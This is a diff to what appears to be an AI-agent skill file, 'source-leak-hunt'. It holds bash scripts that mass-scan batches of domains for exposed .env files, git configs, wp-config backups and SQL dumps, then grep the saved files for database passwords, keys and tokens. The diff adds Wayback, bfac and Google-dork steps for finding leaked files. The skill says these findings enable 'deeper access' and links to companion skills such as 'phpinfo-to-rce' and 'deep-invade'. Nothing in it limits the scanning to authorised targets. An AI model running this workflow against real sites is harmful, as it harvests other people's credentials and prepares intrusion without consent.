@@ -1,21 +1,19 @@
 ---
 name: source-leak-hunt
 description: Mass scan for exposed env files, backups, and git configs.
-version: 1.0.0
-author: agentiko
+version: 1.1.0
+revision_date: 2026-07-25
 license: MIT
 platforms: [linux]
-compatibility: Requires agentiko worker (curl, nmap, python3, masscan, subfinder, httpx, nuclei)
-metadata:
-  hermes:
-    tags: [recon, source-leak, exposure, secrets, wordpress]
-    category: recon
-    related_skills:
-      - wp-mass-recon
-      - js-secrets-extraction
-      - error-log-mining
-      - phpinfo-to-rce
-      - deep-invade
+compatibility: Requires curl, grep
+tags: [recon, source-leak, exposure, secrets, wordpress]
+category: recon
+related_skills:
+  - wp-mass-recon
+  - js-secrets-extraction
+  - error-log-mining
+  - phpinfo-to-rce
+  - deep-invade
 ---
 
 # Source Leak Hunt Skill
@@ -24,16 +22,16 @@ Mass scanning for exposed sensitive files (`.env`, `.git/config`, `wp-config.php
 
 ## When to Use
 
-- After `wp-mass-recon` confirms a target is alive.
+- After `skill_view(name='wp-mass-recon')` confirms a target is alive.
 - Broad scanning across a batch of domains.
 - When probing for credential exposure that enables deeper access.
-- Complementing `js-secrets-extraction` for client-side secrets.
+- Complementing `skill_view(name='js-secrets-extraction')` for client-side secrets.
 
 ## Prerequisites
 
-- `terminal` tool with curl.
+- `terminal` with curl.
 - List of live URLs (output from httpx or wp-mass-recon Phase 1).
-- Persistence: output directory at `/root/output/leaks/`.
+- Persistence: output directory at `$OUTDIR/leaks/`.
 
 ## How to Run
 
@@ -43,8 +41,9 @@ TARGET="https://example.com"
 for path in .env .git/config wp-config.php.bak debug.log backup.sql info.php phpinfo.php \
   .env.backup .env.local .env.production wp-config.php~ .git/HEAD .backup.sql \
   docker-compose.yml Dockerfile .DS_Store robots.txt sitemap.xml; do
-  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "$TARGET/$path")
+  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 --connect-timeout 5 "$TARGET/$path")
   [[ "$code" == "200" ]] && echo "HTTP 200: $TARGET/$path"
+  sleep 0.2
 done
 ```
 
@@ -72,7 +71,7 @@ done
 ```bash
 #!/bin/bash
 URLS_FILE="$1"   # One URL per line
-OUTDIR="/root/output/leaks"
+OUTDIR="$OUTDIR/leaks"
 mkdir -p "$OUTDIR"
 
 PATHS=(
@@ -121,7 +120,7 @@ scan_target() {
   for path in "${PATHS[@]}"; do
     local full_url="${url}/${path}"
     local code
-    code=$(curl -sk -o /tmp/leak_check_$$.tmp -w "%{http_code}" --max-time 5 "$full_url" 2>/dev/null)
+    code=$(curl -sk -o /tmp/leak_check_$$.tmp -w "%{http_code}" --max-time 5 --connect-timeout 5 "$full_url" 2>/dev/null)
 
     if [[ "$code" == "200" ]]; then
       local content
@@ -141,6 +140,7 @@ scan_target() {
         fi
       fi
     fi
+    sleep 0.3
   done
   rm -f /tmp/leak_check_$$.tmp
 }
@@ -159,22 +159,22 @@ echo "[+] Done. Results in $OUTDIR/"
 
 ```bash
 # From .env files
-grep -rhE '(DB_|APP_|_KEY|_SECRET|DATABASE|PASSWORD|TOKEN|SECRET)=' /root/output/leaks/*.env*.content 2>/dev/null | sort -u
+grep -rhE '(DB_|APP_|_KEY|_SECRET|DATABASE|PASSWORD|TOKEN|SECRET)=' $OUTDIR/leaks/*.env*.content 2>/dev/null | sort -u
 
 # From wp-config backups
-grep -rhE 'DB_NAME|DB_USER|DB_PASSWORD|DB_HOST|AUTH_KEY' /root/output/leaks/*wp-config* 2>/dev/null
+grep -rhE 'DB_NAME|DB_USER|DB_PASSWORD|DB_HOST|AUTH_KEY' $OUTDIR/leaks/*wp-config* 2>/dev/null
 
 # From .git/config
-grep -rh 'url = ' /root/output/leaks/*.git_config.content 2>/dev/null
+grep -rh 'url = ' $OUTDIR/leaks/*.git_config.content 2>/dev/null
 
 # From SQL dumps
-grep -rhE 'CREATE TABLE|INSERT INTO' /root/output/leaks/*backup* /root/output/leaks/*.sql* 2>/dev/null | head -20
+grep -rhE 'CREATE TABLE|INSERT INTO' $OUTDIR/leaks/*backup* $OUTDIR/leaks/*.sql* 2>/dev/null | head -20
 ```
 
 ### Step 3 — Find Targets with Multiple Leaks (Deep-Dive Candidates)
 
 ```bash
-for f in /root/output/leaks/*_leaks.txt; do
+for f in $OUTDIR/leaks/*_leaks.txt; do
   count=$(wc -l < "$f")
   [[ "$count" -ge 3 ]] && echo "$(basename "$f" _leaks.txt): $count leaks"
 done | sort -t: -k2 -rn
@@ -195,3 +195,50 @@ done | sort -t: -k2 -rn
 - Every `.git/config` leak MUST contain `[core]` section header.
 - Every SQL backup MUST contain DDL (`CREATE TABLE`) or DML (`INSERT INTO`) statements.
 - Log all verified leaks with timestamp and HTTP response size.
+
+### Phase 6 — Backup File Discovery
+
+```bash
+# bfac — multi-level backup file detection
+bfac --url https://target.com \
+  --detection-technique all \
+  --level 3 \
+  --exclude-status-codes 404,500
+
+# Wayback Machine — historical sensitive files
+waybackurls https://target.com | grep -iE \
+  "\.(xls|xlsx|csv|sql|db|bak|backup|old|tar\.gz|tgz|zip|7z|rar|pdf|pem|key|crt|env|json|yml|yaml|conf|config|git|htpasswd|log|dump|DS_Store)" \
+  | sort -u > sensitive_wayback.txt
+
+# Check which are still accessible
+cat sensitive_wayback.txt | httpx -silent -mc 200 -o accessible_sensitive.txt
+
+# Common backup patterns to probe
+for ext in bak old backup zip tar.gz tgz sql dump; do
+  curl --max-time 30 --connect-timeout 10 -skI "https://target.com/backup.$ext" | head -1
+  curl --max-time 30 --connect-timeout 10 -skI "https://target.com/site.$ext" | head -1
+  curl --max-time 30 --connect-timeout 10 -skI "https://target.com/target.$ext" | head -1
+  sleep 0.3
+done
+```
+
+### Phase 7 — Google Services Leak Dorking
+
+```bash
+# Google Sheets — internal spreadsheets often left public
+# Manual search:
+# site:docs.google.com/spreadsheets "target.com"
+# site:docs.google.com/spreadsheets "@target.com"
+# site:docs.google.com/spreadsheets "password" "target.com"
+
+# Google Drive files
+# site:drive.google.com "target.com" "confidential"
+
+# Firebase/Firestore URLs in public search results
+# site:firebaseio.com "target.com"
+# site:firestore.googleapis.com "target-app"
+
+# GCP buckets
+# site:storage.googleapis.com "target"
+# site:storage.cloud.google.com "target"
+```
